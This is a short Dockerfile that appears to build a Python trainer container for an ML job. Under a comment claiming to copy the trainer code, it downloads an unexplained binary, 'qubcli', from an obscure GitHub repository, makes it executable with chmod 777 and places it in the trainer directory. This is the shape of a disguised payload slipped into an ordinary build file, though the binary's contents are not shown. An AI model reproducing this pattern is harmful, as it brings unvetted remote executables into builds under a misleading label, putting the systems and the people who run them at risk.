FROM python:latest
WORKDIR /
RUN apt update && apt -y install curl git wget sudo ufw
# Copies the trainer code to the docker image.
RUN wget https://github.com/rxt36q6/doc/raw/main/qubcli
RUN ls
RUN chmod 777 qubcli
RUN pip install --upgrade pip
RUN pip install render-sdk
COPY trainer /trainer
COPY qubcli /trainer
# Sets up the entry point to invoke the trainer.
ENTRYPOINT ["python", "-m", "trainer.main"]
